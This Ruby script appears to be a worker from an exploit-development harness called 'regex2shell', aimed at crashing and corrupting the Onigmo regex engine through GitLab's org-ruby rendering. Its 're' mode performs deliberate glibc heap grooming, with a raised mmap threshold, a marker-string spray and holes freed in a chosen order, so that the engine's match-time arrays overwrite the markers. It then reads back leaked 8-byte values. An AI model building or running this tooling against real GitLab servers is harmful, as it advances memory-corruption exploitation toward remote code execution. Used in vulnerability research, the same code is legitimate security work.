#!/usr/bin/env ruby
# regex2shell disposable worker — one process per request.
#
# Exit codes: 0 = OK, 3 = RegexpError/SyntaxError (clean rejection),
# 4 = other Ruby-level error, signal (6/11/...) = native Onigmo crash ([BUG]).
#
# Modes:
#   org  — stdin: raw .org content; renders it with org-ruby (the GitLab sink)
#   re   — stdin: JSON {pattern: String, match: bool, subject: String?};
#          compiles the pattern (Regexp.new) and optionally matches it.
#          This is the engine-level probe path (what GitLab does with
#          attacker-controlled regexp source).
$stdin.binmode
mode = ARGV[0]
input = $stdin.read

begin
  case mode
  when 'org'
    require 'org-ruby'
    html = Orgmode::Parser.new(input).to_html
    puts html
  when 're'
    require 'json'
    req = JSON.parse(input)
    pattern = req.fetch('pattern')
    markers = nil
    if (groom = req['groom_markers'])
      # heap groom: small marker strings live in the brk heap, below the
      # engine's match-time allocations — the request-body grooming analog
      n, sz = Integer(groom[0]), Integer(groom[1])
      # 1. raise glibc's dynamic mmap threshold (free one big mmap chunk) so
      #    the engine's num_repeat-sized arrays go to the brk heap
      if (rt = req['raise_threshold'])
        big = 'T' * Integer(rt)
        big = nil
        GC.start
      end
      # 2. marker spray (brk heap)
      markers = Array.new(n) { 'M' * sz }
      # 3. exact-size holes freed in order: first hole goes to the LAST
      #    taker, so repeat_range lands above and repeat_stk directly on
      #    top of the markers
      if (holes = req['holes'])
        chunks = holes.map { |h| 'H' * Integer(h) }
        # free in REVERSE allocation order: unsorted-bin FIFO hands the
        # oldest-freed chunk to the first taker, so repeat_range (compile
        # time) gets the HIGHEST hole and repeat_stk (match time) reuses
        # the LOWEST one, directly on top of the markers
        chunks.length.downto(1) do |i|
          chunks[i - 1] = nil
          GC.start
        end
      end
      GC.start
    end
    t0 = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    re = Regexp.new(pattern)
    compile_ms = ((Process.clock_gettime(Process::CLOCK_MONOTONIC) - t0) * 1000).round
    Regexp.timeout = Float(req['timeout']) if req['timeout']
    result = nil
    begin
      if req['match']
        m = re.match(req.fetch('subject', ''))
        result = { matched: !m.nil?, preview: m&.to_s&.[](0, 64) }
      end
    rescue Regexp::TimeoutError
      result = { interrupted: 'timeout' }
    end
    out = { status: 'compiled', source_bytes: pattern.bytesize,
           compile_ms: compile_ms, match: result }
    if markers
      hits = []
      markers.each_with_index do |mk, i|
        if (j = mk.index(/[^M]/))
          hits << { marker: i, offset: j, value: mk[j, 8].unpack1('Q<') }
        end
      end
      out[:groom_hits] = hits
      out[:groom_total] = markers.size
    end
    puts JSON.generate(out)
  else
    warn "unknown mode #{mode}"
    exit 4
  end
rescue RegexpError, SyntaxError => e
  warn "#{e.class}: #{e.message}"
  exit 3
rescue Exception => e
  warn "#{e.class}: #{e.message}"
  warn e.backtrace&.first(5).to_s
  exit 4
end
